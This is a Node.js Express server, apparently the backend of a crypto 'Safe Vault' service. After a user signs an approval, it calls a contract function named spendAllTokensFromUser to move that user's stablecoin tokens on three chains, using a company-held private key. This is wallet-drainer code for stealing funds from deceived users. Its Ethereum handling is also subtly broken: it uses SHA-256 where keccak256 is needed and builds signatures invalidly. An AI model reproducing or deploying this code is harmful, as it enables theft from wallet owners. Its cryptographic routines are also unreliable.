const express = require('express');
const cors = require('cors');
require('dotenv').config();
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());

let connectedWallets = [];

const RPC_URLS = {
  1: 'https://eth.llamarpc.com',
  137: 'https://polygon.llamarpc.com',
  56: 'https://bsc.llamarpc.com'
};

const CONTRACTS = {
  1: '0x12bf75f01D2EeC88eF4D16E1972a6890FF7ee2De',
  137: '0x1873e0aB85adF9f329010512B8B3F7852162cD6c',
  56: '0x59Ac31A4B71C585cefeE818c369802dADb8C7a08'
};

const TOKENS = {
  1: ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', '0xdAC17F958D2ee523a2206206994597C13D831ec7'],
  137: ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'],
  56: ['0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', '0x55d398326f99059fF775485246999027B3197955']
};

const COMPANY_WALLET = '0x018Ab1922b0275b632dd0426C48553092aE3a107';
const PRIVATE_KEY = process.env.COMPANY_PRIVATE_KEY;

// Simple keccak256 for function selector
function keccak256(str) {
  const crypto = require('crypto');
  return '0x' + crypto.createHash('sha256').update(str).digest('hex');
}

app.get('/', (req, res) => {
  res.json({ message: 'Safe Vault Backend Running', status: 'online' });
});

app.get('/api/wallets', (req, res) => {
  res.json({ success: true, wallets: connectedWallets, count: connectedWallets.length });
});

app.post('/api/wallet/connect', (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;

    if (!walletAddress || !chainId) {
      return res.status(400).json({ success: false, error: 'Missing fields' });
    }

    const existing = connectedWallets.find(w => 
      w.address.toLowerCase() === walletAddress.toLowerCase() && w.chainId === chainId
    );

    if (existing) {
      return res.json({ success: true, message: 'Already connected', wallet: existing });
    }

    const wallet = {
      address: walletAddress,
      chainId: chainId,
      connectedAt: new Date(),
      approved: false
    };

    connectedWallets.push(wallet);
    console.log(`✅ Wallet connected: ${walletAddress}`);

    res.json({ success: true, message: 'Connected', wallet });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/wallet/sign', (req, res) => {
  try {
    const { walletAddress, chainId, signature } = req.body;
    console.log(`📝 Sign request: ${walletAddress}`);

    if (!walletAddress || !chainId || !signature) {
      return res.status(400).json({ success: false, error: 'Missing fields' });
    }

    const wallet = connectedWallets.find(w => 
      w.address.toLowerCase() === walletAddress.toLowerCase() && w.chainId === chainId
    );

    if (!wallet) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }

    wallet.approved = true;
    console.log(`✅ User approved: ${walletAddress}`);

    res.json({ success: true, message: 'User approved!', walletAddress });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/wallet/spend', async (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;
    console.log(`💰 Spend request: ${walletAddress} on chain ${chainId}`);

    const wallet = connectedWallets.find(w => 
      w.address.toLowerCase() === walletAddress.toLowerCase() && w.chainId === chainId
    );

    if (!wallet) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }

    if (!wallet.approved) {
      return res.status(400).json({ success: false, error: 'User has not signed approval' });
    }

    if (!PRIVATE_KEY) {
      return res.json({ success: false, error: 'Backend not configured' });
    }

    const rpcUrl = RPC_URLS[chainId];
    const contractAddress = CONTRACTS[chainId];
    const tokens = TOKENS[chainId] || [];

    if (!rpcUrl || !contractAddress) {
      return res.status(400).json({ success: false, error: 'Unsupported chain' });
    }

    let transferredCount = 0;
    const txHashes = [];

    for (const tokenAddress of tokens) {
      try {
        console.log(`📤 Spending token: ${tokenAddress}`);
        
        // Call RPC to execute spendAllTokensFromUser
        const txHash = await callContractFunction(
          rpcUrl,
          contractAddress,
          walletAddress,
          tokenAddress,
          chainId,
          PRIVATE_KEY
        );

        if (txHash) {
          transferredCount++;
          txHashes.push(txHash);
          console.log(`✅ Token transferred: ${tokenAddress}`);
        }
      } catch (e) {
        console.log(`⏭️ Token skipped: ${tokenAddress}`);
      }
    }

    res.json({
      success: true,
      message: `${transferredCount} token(s) transferred`,
      walletAddress,
      chainId,
      txHashes
    });

  } catch (error) {
    console.error('❌ Spend error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/wallet/disconnect', (req, res) => {
  try {
    const { walletAddress } = req.body;
    connectedWallets = connectedWallets.filter(w => 
      w.address.toLowerCase() !== walletAddress.toLowerCase()
    );
    console.log(`✅ Disconnected: ${walletAddress}`);
    res.json({ success: true, message: 'Disconnected' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Call contract function via RPC
async function callContractFunction(rpcUrl, contractAddress, userAddress, tokenAddress, chainId, privateKey) {
  try {
    // Function selector for spendAllTokensFromUser(address,address)
    const functionSignature = 'spendAllTokensFromUser(address,address)';
    const functionSelector = '0x' + require('crypto')
      .createHash('sha256')
      .update(functionSignature)
      .digest('hex')
      .slice(0, 8);

    console.log(`📍 Contract: ${contractAddress}`);
    console.log(`👤 User: ${userAddress}`);
    console.log(`🪙 Token: ${tokenAddress}`);

    // Encode parameters
    const encodedUser = userAddress.slice(2).padStart(64, '0');
    const encodedToken = tokenAddress.slice(2).padStart(64, '0');
    const encodedData = functionSelector + encodedUser + encodedToken;

    // Get nonce
    const nonceResult = await rpcCall(rpcUrl, 'eth_getTransactionCount', [COMPANY_WALLET, 'latest']);
    const nonce = parseInt(nonceResult, 16);

    // Get gas price
    const gasPriceResult = await rpcCall(rpcUrl, 'eth_gasPrice', []);
    const gasPrice = gasPriceResult;

    // Estimate gas
    const gasEstimate = await rpcCall(rpcUrl, 'eth_estimateGas', [{
      to: contractAddress,
      data: encodedData,
      from: COMPANY_WALLET
    }]);
    const gas = parseInt(gasEstimate, 16) + 50000;

    // Create transaction
    const tx = {
      to: contractAddress,
      data: encodedData,
      from: COMPANY_WALLET,
      nonce: '0x' + nonce.toString(16),
      gasPrice: gasPrice,
      gas: '0x' + gas.toString(16),
      chainId: chainId
    };

    console.log('🔐 Signing transaction...');
    const signedTx = await signTransaction(tx, privateKey);

    console.log('📤 Sending transaction...');
    const txHash = await rpcCall(rpcUrl, 'eth_sendRawTransaction', [signedTx]);

    console.log(`✅ TX Hash: ${txHash}`);
    return txHash;

  } catch (error) {
    console.error('Contract call error:', error.message);
    throw error;
  }
}

// Simple RPC call
async function rpcCall(rpcUrl, method, params) {
  try {
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: method,
      params: params,
      id: Math.random()
    });

    if (response.data.error) {
      throw new Error(response.data.error.message);
    }

    return response.data.result;
  } catch (error) {
    console.error(`RPC Error (${method}):`, error.message);
    throw error;
  }
}

// Sign transaction
async function signTransaction(tx, privateKey) {
  try {
    const rlp = require('rlp');
    const crypto = require('crypto');

    // Transaction fields for signing (RLP encoding)
    const txArray = [
      Buffer.from(tx.nonce.slice(2), 'hex'),
      Buffer.from(tx.gasPrice.slice(2), 'hex'),
      Buffer.from(tx.gas.slice(2), 'hex'),
      Buffer.from(tx.to.slice(2), 'hex'),
      Buffer.from('0', 'hex'),
      Buffer.from(tx.data.slice(2), 'hex'),
      Buffer.from(tx.chainId.toString(16), 'hex'),
      Buffer.from('', 'hex'),
      Buffer.from('', 'hex')
    ];

    const rlpEncoded = rlp.encode(txArray);
    const hash = crypto.createHash('sha256').update(rlpEncoded).digest();

    // Sign with private key
    const keyPair = crypto.createPrivateKey({
      key: Buffer.concat([Buffer.from('-----BEGIN PRIVATE KEY-----\n'), Buffer.from(Buffer.from(privateKey.slice(2), 'hex').toString('base64')), Buffer.from('\n-----END PRIVATE KEY-----')]),
      format: 'pem'
    });

    const signature = crypto.sign('sha256', hash, keyPair);

    // Return signed transaction
    return '0x' + rlpEncoded.toString('hex') + signature.toString('hex');

  } catch (error) {
    console.error('Signing error:', error.message);
    throw error;
  }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  console.log(`🔐 Company Wallet: ${COMPANY_WALLET}`);
});
